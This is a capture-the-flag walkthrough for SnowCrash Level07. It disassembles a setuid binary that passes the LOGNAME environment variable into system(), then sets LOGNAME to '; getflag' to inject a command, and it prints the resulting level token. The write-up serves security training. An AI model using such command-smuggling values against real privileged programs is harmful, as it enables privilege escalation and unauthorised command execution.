# SnowCrash - Level07

## Objective

Find the password for the next level by logging into the `flag07` account.

## Steps

### 1. Locate files needed for the challenge

```bash
level07@SnowCrash:~$ ls
level07
```

Just a single x86 binary, let's open it in gdb

```bash
(gdb) disas 0x8048514
Dump of assembler code for function main:
   0x08048514 <+0>:	push   ebp
   0x08048515 <+1>:	mov    ebp,esp
   0x08048517 <+3>:	and    esp,0xfffffff0
   0x0804851a <+6>:	sub    esp,0x20
   0x0804851d <+9>:	call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:	mov    DWORD PTR [esp+0x18],eax
   0x08048526 <+18>:	call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804852f <+27>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048533 <+31>:	mov    DWORD PTR [esp+0x8],eax
   0x08048537 <+35>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804853b <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x0804853f <+43>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048543 <+47>:	mov    DWORD PTR [esp],eax
   0x08048546 <+50>:	call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804854f <+59>:	mov    DWORD PTR [esp+0x8],eax
   0x08048553 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048557 <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x0804855b <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804855f <+75>:	mov    DWORD PTR [esp],eax
   0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:	mov    DWORD PTR [esp+0x14],0x0
   0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
   0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>:	lea    eax,[esp+0x14]
   0x0804858b <+119>:	mov    DWORD PTR [esp],eax
---Type <return> to continue, or q <return> to quit---
   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048597 <+131>:	mov    DWORD PTR [esp],eax
=> 0x0804859a <+134>:	call   0x8048410 <system@plt>
   0x0804859f <+139>:	leave  
   0x080485a0 <+140>:	ret    
```

Looks like a very straightforward challenge at first glance, it's getting a value from the environment with getenv, building a formatted string with asprintf and passing the result to the system syscall, let's poke at memory a bit 

```bash
(gdb) x/s 0x8048680
0x8048680:	 "LOGNAME"
```

This is the key that gets looked up by getenv, let's try modifying it with our own command.

```bash
level07@SnowCrash:~$ export LOGNAME="; getflag"
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Done :)
